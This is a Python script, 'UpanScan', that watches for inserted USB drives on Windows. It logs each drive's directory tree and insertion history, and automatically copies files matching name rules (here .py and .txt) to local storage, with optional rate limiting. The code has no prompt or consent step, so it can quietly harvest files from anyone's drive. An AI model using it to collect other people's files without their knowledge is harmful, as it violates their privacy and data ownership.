# UpanScan
from generate_directory_structure import generate_directory_structure
from get_usb_info_wmi import get_usb_info_wmi
from _Logger import Logger
import os
import sys
import json
import time
import shutil
import threading
from datetime import datetime
from pathlib import Path
from rich import print
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

# 获取当前脚本所在目录的上上级目录路径
parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
# 将上上级目录添加到 sys.path
sys.path.append(parent_dir)

from my_untils.modules._async import _async

# -----------------------
# 配置区

# 工作目录
BASE_PWD = os.getcwd()

# 保存的路径，文件夹不存在会自动创建
SAVE_PATH = "UpanScan"
# SAVE_PATH 文件夹结构
# SAVE_PATH
#     |-- UpanScan_logs.log
#     |-- SAVE
#     |    |-- files
#     |    |    |-- USB_序列号1
#     |    |    |   |-- 文件夹1
#     |    |    |   |   |-- 文件1.txt
#     |    |    |   |   |-- 文件2.txt
#     |    |    |   |-- 文件夹2
#     |    |    |   |   |-- 文件3.txt
#     |    |    |-- USB_序列号2
#     |    |    |   |-- 文件夹3
#     |    |    |   |   |-- 文件4.txt
#     |    |    |   |   |-- 文件5.txt
#     |-- files_records
#     |    |-- 序列号1
#     |    |   |-- 1
#     |    |   |   |-- files_records.json
#     |    |   |-- 2
#     |    |   |   |-- files_records.json
#     |-- 序列号1_records.json 记录每次扫描的文件信息，json格式

# 序列号黑白名单
# 模式说明
# WHITE: 白名单模式，只有在白名单中的USB设备才会被扫描到
# BLACK: 黑名单模式，黑名单中的USB设备不会被扫描到
MODE = ""
WHITE_LIST = ["12345678901234567890123456789012"]
BLACK_LIST = ["09876543210987654321098765432109"]

# 扫描深度
SCAN_DEEP = 8

# 复制文件
COPY_FILE_ENABLE = True # 是否复制文件，默认True
COPY_FILE_RATE = 0.5 # 复制文件的速率，默认0.5Mb/s，仅当 COPY_FILE_THREAD 为 1 时生效
COPY_FILE_THREAD = 1  # 复制文件的线程数，默认5，复制小文件可能有奇效，建议保持默认值（1）

# 匹配规则
# MATCH_RULE = [
#     {
#         "name": {
#             "enable": True,
#             # 留空则不考虑
#             "include": ["A"],
#             "exclude": ["B"],
#             "startwith": ["c"],
#             "endwith": ["d"],
#             "re": ["[0-9]+"], # 正则表达式匹配，留空则不考虑
#         },
#         "path": {
#             "enable": True,
#             "path": {
#                 "_include": ["G"], # 路径应该包含的内容
#                 "path_exclude": ["H"]
#             },
#             "parent_path": {
#                 "include": ["E"], # 父文件夹应该包含的内容
#                 "exclude": ["F"]
#             }
#         },
#         "size": {
#             "enable": True,
#             "min": 1,  # 最小值，单位Mb，默认0
#             "max": 10,  # 最大值，单位Mb，默认无穷大
#         },
#         "time": {
#             "enable": True,
#             "modify": {
#                 "start": "2023-01-01 00:00:00",  # 起始时间，格式"YYYY-MM-DD HH:MM:SS"，默认无起始时间
#                 "end": "2023-12-31 23:59:59",    # 结束时间，格式"YYYY-MM-DD HH:MM:SS"，默认无结束时间
#             },
#             "create": {
#                 "start": "2023-01-01 00:00:00",  # 起始时间，格式"YYYY-MM-DD HH:MM:SS"，默认无起始时间
#                 "end": "2023-12-31 23:59:59",    # 结束时间，格式"YYYY-MM-DD HH:MM:SS"，默认无结束时间
#             },
#         },
#     }
# ]

MATCH_RULE = [
    {
        "name": {
            "enable": True,
            # 留空则不考虑
            "include": [""],
            "exclude": [],
            "startwith": [""],
            "endwith": [".py",".txt"],
            "re": [""], # 正则表达式匹配，留空则不考虑
        },
        "path": {
            "enable": False,
            "path": {
                "_include": ["G"], # 路径应该包含的内容
                "path_exclude": ["H"]
            },
            "parent_path": {
                "include": ["E"], # 父文件夹应该包含的内容
                "exclude": ["F"]
            }
        },
        "size": {
            "enable": False,
            "min": 1,  # 最小值，单位Mb，默认0
            "max": 10,  # 最大值，单位Mb，默认无穷大
        },
        "time": {
            "enable": False,
            "modify": {
                "start": "2023-01-01 00:00:00",  # 起始时间，格式"YYYY-MM-DD HH:MM:SS"，默认无起始时间
                "end": "2023-12-31 23:59:59",    # 结束时间，格式"YYYY-MM-DD HH:MM:SS"，默认无结束时间
            },
            "create": {
                "start": "2023-01-01 00:00:00",  # 起始时间，格式"YYYY-MM-DD HH:MM:SS"，默认无起始时间
                "end": "2023-12-31 23:59:59",    # 结束时间，格式"YYYY-MM-DD HH:MM:SS"，默认无结束时间
            },
        },
    }
]

# 日志文件路径
LOG_FILE_PATH = "UpanScan_logs.log"
# -----------------------

class UpanScan:
    def __init__(self):
        self.base_path = Path(BASE_PWD)
        self.save_path = Path(SAVE_PATH)
        self.log_file_path = self.base_path / LOG_FILE_PATH
        
        # 创建保存目录
        self.save_path.mkdir(parents=True, exist_ok=True)
        (self.save_path / "SAVE" / "files").mkdir(parents=True, exist_ok=True)
        (self.save_path / "files_records").mkdir(parents=True, exist_ok=True)
        
        self.log = Logger(log_file_path=self.log_file_path)
        self.current_usbs = {}
        self.scanning = False
        self.copy_threads = []
        
        self.log.info("UpanScan 初始化完成")

    def check_usb_permission(self, usb_info):
        """检查USB设备是否在黑白名单中"""
        serial = usb_info.get('serial_number', '')
        
        if MODE == "WHITE":
            return serial in WHITE_LIST
        elif MODE == "BLACK":
            return serial not in BLACK_LIST
        else:
            return True

    def match_file_rules(self, file_info):
        """检查文件是否匹配规则"""
        for rule in MATCH_RULE:
            if self._check_single_rule(file_info, rule):
                return True
        return False

    def _check_single_rule(self, file_info, rule):
        """检查单个规则"""
        # 检查文件名规则
        if rule['name']['enable']:
            if not self._check_name_rule(file_info['name'], rule['name']):
                return False
        
        # 检查路径规则
        if rule['path']['enable']:
            if not self._check_path_rule(file_info['path'], rule['path']):
                return False
        
        # 检查大小规则
        if rule['size']['enable']:
            file_size_mb = file_info['size'] / (1024 * 1024)  # 转换为MB
            min_size = rule['size'].get('min', 0)
            max_size = rule['size'].get('max', float('inf'))
            if not (min_size <= file_size_mb <= max_size):
                return False
        
        # 检查时间规则
        if rule['time']['enable']:
            if not self._check_time_rule(file_info, rule['time']):
                return False
        
        return True

    def _check_name_rule(self, filename, name_rule):
        """检查文件名规则"""
        # 包含检查
        if name_rule.get('include'):
            if not any(inc in filename for inc in name_rule['include']):
                return False
        
        # 排除检查
        if name_rule.get('exclude'):
            if any(exc in filename for exc in name_rule['exclude']):
                return False
        
        # 开头检查
        if name_rule.get('startwith'):
            if not any(filename.startswith(sw) for sw in name_rule['startwith']):
                return False
        
        # 结尾检查
        if name_rule.get('endwith'):
            if not any(filename.endswith(ew) for ew in name_rule['endwith']):
                return False
        
        # 正则检查
        if name_rule.get('re'):
            import re
            if not any(re.search(pattern, filename) for pattern in name_rule['re']):
                return False
        
        return True

    def _check_path_rule(self, filepath, path_rule):
        """检查路径规则"""
        path_str = str(filepath).lower()
        
        # 路径包含检查
        if path_rule['path'].get('_include'):
            if not any(inc.lower() in path_str for inc in path_rule['path']['_include']):
                return False
        
        # 路径排除检查
        if path_rule['path'].get('path_exclude'):
            if any(exc.lower() in path_str for exc in path_rule['path']['path_exclude']):
                return False
        
        # 父路径检查
        parent_path = Path(filepath).parent.name.lower()
        if path_rule['parent_path'].get('include'):
            if not any(inc.lower() in parent_path for inc in path_rule['parent_path']['include']):
                return False
        
        if path_rule['parent_path'].get('exclude'):
            if any(exc.lower() in parent_path for exc in path_rule['parent_path']['exclude']):
                return False
        
        return True

    def _check_time_rule(self, file_info, time_rule):
        """检查时间规则"""
        try:
            # 修改时间检查
            if time_rule.get('modify'):
                modify_time = datetime.strptime(file_info['modify_time'], "%Y-%m-%d %H:%M:%S")
                start_str = time_rule['modify'].get('start')
                end_str = time_rule['modify'].get('end')
                
                if start_str:
                    start_time = datetime.strptime(start_str, "%Y-%m-%d %H:%M:%S")
                    if modify_time < start_time:
                        return False
                
                if end_str:
                    end_time = datetime.strptime(end_str, "%Y-%m-%d %H:%M:%S")
                    if modify_time > end_time:
                        return False
            
            # 创建时间检查
            if time_rule.get('create'):
                create_time = datetime.strptime(file_info['create_time'], "%Y-%m-%d %H:%M:%S")
                start_str = time_rule['create'].get('start')
                end_str = time_rule['create'].get('end')
                
                if start_str:
                    start_time = datetime.strptime(start_str, "%Y-%m-%d %H:%M:%S")
                    if create_time < start_time:
                        return False
                
                if end_str:
                    end_time = datetime.strptime(end_str, "%Y-%m-%d %H:%M:%S")
                    if create_time > end_time:
                        return False
        
        except Exception as e:
            self.log.error(f"时间规则检查错误: {e}")
            return False
        
        return True

    def copy_file_with_rate_limit(self, src_path, dst_path, rate_limit):
        """带速率限制的文件复制"""
        # 检查目标文件是否存在
        if os.path.exists(dst_path):
            # 获取源文件和目标文件的修改时间
            src_mtime = os.path.getmtime(src_path)
            dst_mtime = os.path.getmtime(dst_path)
            
            # 如果源文件不比目标文件新，则跳过复制
            if src_mtime <= dst_mtime:
                self.log.debug(f"跳过复制 {src_path} -> {dst_path}，目标文件已是最新")
                return
        
        if COPY_FILE_THREAD == 1:
            # 单线程速率限制
            file_size = os.path.getsize(src_path)
            expected_time = file_size / (rate_limit * 1024 * 1024)  # 秒
            
            start_time = time.time()
            shutil.copy2(src_path, dst_path)
            copy_time = time.time() - start_time
            
            if copy_time < expected_time:
                time.sleep(expected_time - copy_time)
        else:
            # 多线程直接复制
            shutil.copy2(src_path, dst_path)

    def scan_and_copy_files(self, usb_info, structure):
        """扫描并复制匹配的文件"""
        matched_files = []
        
        def _scan_items(items):
            for item in items:
                if item['type'] == 'file' and self.match_file_rules(item):
                    matched_files.append(item)
                if item.get('items'):
                    _scan_items(item['items'])
        
        _scan_items(structure)

        
        if COPY_FILE_ENABLE and matched_files:
            self.log.info(f"找到 {len(matched_files)} 个匹配的文件，开始复制...")
            
            # 创建目标目录
            usb_save_dir = self.save_path / "SAVE" / "files" / usb_info['serial_number']
            usb_save_dir.mkdir(parents=True, exist_ok=True)
            
            # 复制文件
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeRemainingColumn(),
            ) as progress:
                task = progress.add_task("复制文件...", total=len(matched_files))
                
                for file_info in matched_files:
                    src_path = Path(file_info['path'])
                    # 保持相对路径结构
                    relative_path = src_path.relative_to(usb_info['device'])
                    dst_path = usb_save_dir / relative_path
                    
                    # 创建目标目录
                    dst_path.parent.mkdir(parents=True, exist_ok=True)
                    
                    try:
                        if COPY_FILE_THREAD > 1:
                            # 多线程复制
                            thread = threading.Thread(
                                target=self.copy_file_with_rate_limit,
                                args=(src_path, dst_path, COPY_FILE_RATE)
                            )
                            thread.start()
                            self.copy_threads.append(thread)
                        else:
                            # 单线程复制
                            self.copy_file_with_rate_limit(src_path, dst_path, COPY_FILE_RATE)
                        
                        progress.advance(task)
                    except Exception as e:
                        self.log.error(f"复制文件失败 {src_path} -> {dst_path}: {e}")
            
            # 等待所有线程完成
            for thread in self.copy_threads:
                thread.join()
        
        return matched_files

    def load_usb_history(self, serial_number):
        """加载USB设备历史记录"""
        history_file = self.save_path / f"{serial_number}_records.json"
        if history_file.exists():
            with open(history_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            return {
                "device": "",
                "volume_name": "",
                "serial_number": serial_number,
                "insertion_records": [],
                "files_records_paths": {}  # 改为存储文件记录路径
            }

    def save_usb_history(self, usb_history):
        """保存USB设备历史记录"""
        history_file = self.save_path / f"{usb_history['serial_number']}_records.json"
        with open(history_file, 'w', encoding='utf-8') as f:
            json.dump(usb_history, f, ensure_ascii=False, indent=2)

    def save_files_records(self, serial_number, record_id, structure):
        """保存文件记录到单独的文件"""
        files_records_dir = self.save_path / "files_records" / serial_number
        files_records_dir.mkdir(parents=True, exist_ok=True)
        
        files_records_file = files_records_dir / f"{str(record_id)}_files_records.json"
        with open(files_records_file, 'w', encoding='utf-8') as f:
            json.dump(structure, f, ensure_ascii=False, indent=2)
        
        return str(files_records_file.relative_to(self.save_path))

    def calculate_stats(self, structure):
        """计算文件统计信息"""
        total_count = 0
        files_count = 0
        dirs_count = 0
        total_size = 0
        
        def _count_items(items):
            nonlocal total_count, files_count, dirs_count, total_size
            for item in items:
                total_count += 1
                if item['type'] == 'file':
                    files_count += 1
                    total_size += item['size']
                else:
                    dirs_count += 1
                if item.get('items'):
                    _count_items(item['items'])
        
        _count_items(structure)
        return total_count, files_count, dirs_count, total_size

    def usb_detected(self, usb_info):
        """处理USB设备插入事件"""
        if not self.check_usb_permission(usb_info):
            self.log.info(f"USB设备 {usb_info['device']} 不在允许列表中，跳过扫描")
            return
        
        serial = usb_info['serial_number']
        self.log.info(f"检测到USB设备: {usb_info['device']} (序列号: {serial})")
        
        # 加载历史记录
        usb_history = self.load_usb_history(serial)
        usb_history['device'] = usb_info['device']
        usb_history['volume_name'] = usb_info['volume_name']
        
        # 记录插入时间
        insertion_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        record_id = len(usb_history['insertion_records']) + 1
        
        insertion_record = {
            "id": record_id,
            "insertion_time": insertion_time,
            "removal_time": "",
            "duration": 0,
            "total_count": 0,
            "files_count": 0,
            "dirs_count": 0,
            "total_size": 0
        }
        
        # 扫描目录结构
        try:
            structure = generate_directory_structure(usb_info['device'], SCAN_DEEP)
            
            # 计算统计信息
            total_count, files_count, dirs_count, total_size = self.calculate_stats(structure)
            insertion_record.update({
                "total_count": total_count,
                "files_count": files_count,
                "dirs_count": dirs_count,
                "total_size": total_size
            })
            
            # 保存文件记录到单独的文件
            files_records_path = self.save_files_records(serial, record_id, structure)
            usb_history['files_records_paths'][str(record_id)] = files_records_path
            
            
            
            self.log.info(f"扫描完成: 总计{total_count}项, 文件{files_count}个, 文件夹{dirs_count}个, 大小{total_size}字节")
            
        except Exception as e:
            self.log.error(f"扫描USB设备失败: {e}")
            structure = []
        
        # 添加到插入记录
        usb_history['insertion_records'].append(insertion_record)
        self.current_usbs[serial] = {
            'info': usb_info,
            'insertion_time': insertion_time,
            'record_id': record_id
        }
        
        # 保存历史记录
        self.save_usb_history(usb_history)

        # 扫描并复制匹配的文件
        try:
            matched_files = self.scan_and_copy_files(usb_info, structure)
        except Exception as e:
            self.log.error(f"复制文件失败: {e}")



    def usb_removed(self, usb_info):
        """处理USB设备移除事件"""
        serial = usb_info['serial_number']
        if serial in self.current_usbs:
            removal_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # 加载历史记录
            usb_history = self.load_usb_history(serial)
            
            # 更新最后一条插入记录
            if usb_history['insertion_records']:
                last_record = usb_history['insertion_records'][-1]
                if last_record['removal_time'] == "":
                    last_record['removal_time'] = removal_time
                    
                    # 计算持续时间
                    insertion_time = datetime.strptime(last_record['insertion_time'], "%Y-%m-%d %H:%M:%S")
                    removal_time_dt = datetime.strptime(removal_time, "%Y-%m-%d %H:%M:%S")
                    last_record['duration'] = (removal_time_dt - insertion_time).total_seconds()
            
            # 保存历史记录
            self.save_usb_history(usb_history)
            
            del self.current_usbs[serial]
            self.log.info(f"USB设备移除: {usb_info['device']} (序列号: {serial})")

    def monitor_usbs(self):
        """监控USB设备状态"""
        self.log.info("开始监控USB设备...")
        last_usbs = {}
        
        while self.scanning:
            try:
                current_usbs_list = get_usb_info_wmi()
                current_usbs_dict = {usb['serial_number']: usb for usb in current_usbs_list}
                
                # 检测新插入的USB设备
                for serial, usb_info in current_usbs_dict.items():
                    if serial not in last_usbs:
                        self.usb_detected(usb_info)
                
                # 检测移除的USB设备
                for serial, usb_info in last_usbs.items():
                    if serial not in current_usbs_dict:
                        self.usb_removed(usb_info)
                
                last_usbs = current_usbs_dict
                time.sleep(5)  # 每5秒检查一次
                
            except Exception as e:
                self.log.error(f"监控USB设备时发生错误: {e}")
                time.sleep(10)

    def start(self):
        """启动监控"""
        self.scanning = True
        self.log.info("UpanScan 启动")
        
        try:
            self.monitor_usbs()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """停止监控"""
        self.scanning = False
        self.log.info("UpanScan 停止")
        
        # 等待所有复制线程完成
        for thread in self.copy_threads:
            thread.join()

def main():
    """主函数"""
    upan_scan = UpanScan()
    
    try:
        upan_scan.start()
    except Exception as e:
        upan_scan.log.error(f"程序运行错误: {e}")
    finally:
        upan_scan.stop()

if __name__ == "__main__":
    main()